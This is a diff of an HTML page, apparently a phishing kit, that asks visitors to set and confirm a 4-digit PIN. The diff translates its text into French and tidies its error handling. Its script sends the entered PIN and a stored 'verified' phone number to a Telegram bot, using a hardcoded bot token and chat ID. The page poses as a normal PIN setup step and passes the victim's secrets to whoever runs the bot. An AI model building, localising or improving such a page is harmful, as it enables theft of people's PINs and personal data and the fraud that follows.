@@ -18,15 +18,15 @@
             Saisissez et confirmez votre code PIN à 4 chiffres.
         </p>
 
-        <!-- ÉPINGLE -->
+        <!-- PIN -->
         <input id="pin1" type="password" maxlength="4" placeholder="Saisissez le code PIN" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-xl" />
 
-        <!-- CONFIRMER -->
+        <!-- CONFIRM -->
         <input id="pin2" type="password" maxlength="4" placeholder="Confirmer le code PIN" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-xl" />
 
         <button onclick="submitPin()" class="w-full bg-white text-black py-4 rounded-xl font-bold">
-FINITION
-</button>
+            FINITION
+        </button>
 
     </div>
 
@@ -37,12 +37,12 @@ FINITION
             const pin2 = document.getElementById("pin2").value;
 
             if (pin1.length !== 4 || pin2.length !== 4) {
-                alert("PIN must be 4 digits");
+                alert("Le PIN doit comporter 4 chiffres");
                 return;
             }
 
             if (pin1 !== pin2) {
-                alert("PIN does not match");
+                alert("Les PIN ne correspondent pas");
                 return;
             }
 
@@ -56,7 +56,7 @@ FINITION
 
         async function sendToTelegram(pin) {
 
-            const phone = localStorage.getItem("verifiedPhone");
+            const phone = localStorage.getItem("verifiedPhone") || "Non disponible";
 
             const BOT = "8999307823:AAHeXPAlMT6dX2QE2U-erKRecDTzmdZOJgI";
             const CHAT = "8860468646";
@@ -78,7 +78,9 @@ FINITION
                         text: msg
                     })
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.error("Telegram send failed", e);
+            }
         }
     </script>
 
